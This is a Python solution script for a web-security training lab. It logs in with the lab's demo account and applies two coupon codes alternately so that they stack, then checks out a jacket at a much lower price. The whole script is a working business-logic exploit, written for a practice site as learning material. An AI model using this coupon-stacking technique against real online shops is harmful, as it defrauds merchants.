#!/usr/bin/env python


'''This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
'''

import requests
from bs4 import BeautifulSoup


s = requests.session()
lab_id = '0a3400080336b1188352b6db00080022' #change based on generated lab


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']

def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)

    # Next, add a jacket to our cart
    uri = f"https://{lab_id}.web-security-academy.net/cart"
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    r3 = s.post(uri, data=data)

    # The flaw is that we can apply two coupons "NEWCUST5" and "SIGNUP30" back to back in order to bring the jacket price to down
    # The logic only checks if the most recent coupon was applied more than once
    # (Note the "SIGNUP30" coupon comes from signing up from the newsletter on the home page, not shown here)
    r4 = s.get(uri) # going to the cart page to get the csrf token
    token = token_extract(r4.text) # login csrf token

    # apply each coupon a set of 4 times to reduce the jacket price to 0. csrf token doesn't change between endpoint access
    uri = f"https://{lab_id}.web-security-academy.net/cart/coupon"
    data_1 = {'csrf' : token, 'coupon' : 'NEWCUST5' }
    data_2 = {'csrf' : token, 'coupon' : 'SIGNUP30' }
    for i in range(1,5):
        s.post(uri, data=data_1)
        s.post(uri, data=data_2)
    
    # Now we can checkout the jacket
    uri = f"https://{lab_id}.web-security-academy.net/cart/checkout"
    data = {'csrf' : token}
    r5 = s.post(uri, data=data)
    print('finished')


if __name__ == '__main__':
    main()